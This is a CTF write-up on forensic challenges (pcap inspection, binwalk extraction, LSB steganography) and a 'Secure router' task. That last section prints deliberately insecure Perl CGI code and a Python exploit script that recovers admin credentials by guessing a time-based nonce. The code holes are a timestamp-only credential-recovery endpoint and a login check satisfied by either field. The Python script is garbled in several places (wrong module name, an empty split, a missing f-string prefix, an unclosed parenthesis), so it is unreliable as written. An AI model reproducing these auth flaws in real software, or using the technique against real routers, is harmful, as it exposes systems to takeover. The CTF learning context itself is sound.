---
layout: post
title: TheCyberCoopCTF - Forensic 
description: All forensic challenges I solved
tags: [CTFtime, TheCyberCoopCTF, Writeup, Blue Team]
---
Hi everyone, a few day ago I participated in a CTF competition named as a title, and I solved so many challenges in it. And now I want to write my solution here to share my knowledge and sometime I can look back. So let's start!

## Lost at sea:
With this challenge, we have a pcapng file. And very simple, we just open it by Wireshark and you can see the flag inside the packet:<br>
![]({{site.url}}/assets/images/thecybercoopctf/1.png)<br>

## Babyhide:

We have a picture, and follow my routine, I will check if there're files inside the picture or not by binwalk:<br>
![]({{site.url}}/assets/images/thecybercoopctf/2.png)<br>
As you can see there's a PDF document, and now we just extract it and see what inside the file:<br>
```
binwalk --dd=".*" babyhide.jpeg
cd _babyhide.jpeg.extracted/
open 1CAB6
```

![]({{site.url}}/assets/images/thecybercoopctf/3.png)

## Funding secured

Still a picture and we have to explore it, arghhhhhhh! I tried to use binwalk as the previous challenge, but it's not worked.<br>
After observiing the file, I decided to extract LSB data. So you need to know what is LSB in steganography. Assuming that we have one pixel in whatever image. It can be red, blue, yellow, green, etc. But all of the pixel will have 3 baisc values, they are R G B values (red, green, blue). Some will have 4, they have A (Alpha) which specifies the opacity for a color. In this challenge, we can put that to one side.

What will happen to those values? RGB(A) use 8 bits for R, G and B. Each color has values ranging from 0 to 255. So you can imagine a pixel will have a structure like this:<br>
_(R-value G-value B-value) -> Ex: (63 255 127) = 00111111 11111111 01111111)_<br>
If you want to hide one character in this pixel by using LSB technique, for example it's 3 - 011, then it looks exactly like this: _(0011111**0** 1111111**1** 0111111**1**)_

And to extract LSB file, I use CyberChef which is very popular for whom are playing cryptography and steganography:<br>
![]({{site.url}}/assets/images/thecybercoopctf/4.png)

If you observe carefully, you can see there has zip file extension which is "PK" and "creator.txt" which stands for a file inside the zip file. Not waiting, I extracted it to zip file and unzip in my local machine (and don't forget to remove the first 3 bytes because it's not related to zip file):<br>
![]({{site.url}}/assets/images/thecybercoopctf/5.png)<br>

![]({{site.url}}/assets/images/thecybercoopctf/6.png)<br>

## Secure router

In my opinion, this is the best challenge in all challenges I solved. However, when CTF was running, I couldn't solve it because of my overthinking 😔😔😔 (from this case I learned so much about reducing my overthinking :3). 

In this challenge we have a Squashfs filesystem which is a compressed read-only file system for Linux, and our mission is find bugs inside this [router](https://thecybercoopctf-secure-router.chals.io/){:target="_blank"}{:rel="noopener noreferrer"}

First, we open the link, we can see that there're two fields: username and password, and we need to find user:pass to log in and then we can get the flag, sound easy, right?? Beside, we have source code of this router in the Squashfs filesystem (var/www/), let's analyse these codes!!! (Use binwalk to extract files inside it and navigate to var/www)

```
#!/usr/bin/perl

use POSIX qw(strftime);

local ($buffer, @pairs, $pair, $name, $value, %FORM);
# Read in text
$ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;

if ($ENV{'REQUEST_METHOD'} eq "GET") {
   $buffer = $ENV{'QUERY_STRING'};
    # Split information into name/value pairs
    @pairs = split(/&/, $buffer);

    foreach $pair (@pairs) {
       ($name, $value) = split(/=/, $pair);
       $value =~ tr/+/ /;
       $value =~ s/%(..)/pack("C", hex($1))/eg;
       $FORM{$name} = $value;
    }
}


if ($ENV{'REQUEST_METHOD'} eq "POST") {
    read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs) {
        ($name, $value) = split(/=/, $pair);
        $value =~ tr/+/ /;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $FORM{$name} = $value;
    }
}

$timestamp = strftime("%j%m%H%M%Y", localtime);

open(FH,"username.txt") or &dienice("Can't open username.txt: $!");
$username = <FH>;
close(FH);

open(FH,"password.txt") or &dienice("Can't open password.txt: $!");
$password = <FH>;
close(FH);

open(FH,"flag.txt") or &dienice("Can't open flag.txt: $!");
$flag = <FH>;
close(FH);

print "Content-type:text/html\r\n\r\n";

if ($FORM{"username"} ne $username && $FORM{"password"} ne $password){
    print "<html>";
    print "<head>";
    print "<title>Secure Router</title>";
    print "</head>";
    print "<body>";
    print "<center><p>Sorry, your credentials are wrong</p></center>";
    print "</body>";
    print "</html>";
    exit 0;
} else {
    print "<html>";
    print "<head>";
    print "<title>Secure Router</title>";
    print "</head>";
    print "<body>";
    print "<p>Authenticated</p>";
    print "<pre>$flag</pre>";
    print "</body>";
    print "</html>";
}
```
These codes created login page as you see in the link, when they type username and password, these codes will check your credentials in its database. If it has, it will return the flag. I saw all functions in here and I found that there're nothing related to SQL injection, XSS,...<br>

Next, we have a file looks very interesting: **MCU_recover_credentials.pl**:<br>

```
#!/usr/bin/perl
use POSIX qw(strftime);

local ($buffer, @pairs, $pair, $name, $value, %FORM);
# Read in text
$ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;

if ($ENV{'REQUEST_METHOD'} eq "GET") {
   $buffer = $ENV{'QUERY_STRING'};
    # Split information into name/value pairs
    @pairs = split(/&/, $buffer);

    foreach $pair (@pairs) {
       ($name, $value) = split(/=/, $pair);
       $value =~ tr/+/ /;
       $value =~ s/%(..)/pack("C", hex($1))/eg;
       $FORM{$name} = $value;
    }
}


if ($ENV{'REQUEST_METHOD'} eq "POST") {
   $buffer = $ENV{'QUERY_STRING'};
    # Split information into name/value pairs
    @pairs = split(/&/, $buffer);

    foreach $pair (@pairs) {
       ($name, $value) = split(/=/, $pair);
       $value =~ tr/+/ /;
       $value =~ s/%(..)/pack("C", hex($1))/eg;
       $FORM{$name} = $value;
    }

    read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs) {
        ($name, $value) = split(/=/, $pair);
        $value =~ tr/+/ /;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $FORM{$name} = $value;
    }
}

$timestamp = strftime("%j%m%H%M%Y", localtime);

open(FH,"username.txt") or &dienice("Can't open username.txt: $!");
$username = <FH>;
close(FH);

open(FH,"password.txt") or &dienice("Can't open password.txt: $!");
$password = <FH>;
close(FH);

print "Content-type:text/html\r\n\r\n";

if ($FORM{id} ne $timestamp){
    print "<html>";
    print "<head>";
    print "<title>Secure Router</title>";
    print "</head>";
    print "<body>";
    print "<center><p>Sorry, your timestamp nonce has expired</p></center>";
    print "</body>";
    print "</html>";
    exit 0;
}

print "<html>";
print "<head>";
print "<title>Secure Router</title>";
print "</head>";
print "<body>";
print "<p>Password recovered</p>";
print "<p>$username</p>";
print "<p>$password</p>";
print "</body>";
print "</html>";
```

In these first lines, there're nothing until I saw $timestamp variable and all below. In $timestamp variable, it will return the localtime and in the below, they check $timestamp, if yes they will return username and password. Why is so weak mannnnnnnnnnnnnnnnnn???????? Because taking localtime is fucking easy. From here I decided to write a Python script for that:<br>

```
import requests
r = request.get("https://thecybercoopctf-secure-router.chals.io/MCU_serial_forgot_password.pl")

t1 = r.text.split("id=")[1].split("")[0]
print(t1)
rr = request.get("https://thecybercoopctf-secure-router.chals.io/MCU_recover_credentials.pl?id={t1}"
print(rr.text)
```

After I had run script, I got my result: 3491221442023 and my credentials: username=admin; password=ridingexpresstrains

Log in and we get the flag:<br>

![]({{site.url}}/assets/images/thecybercoopctf/7.png)
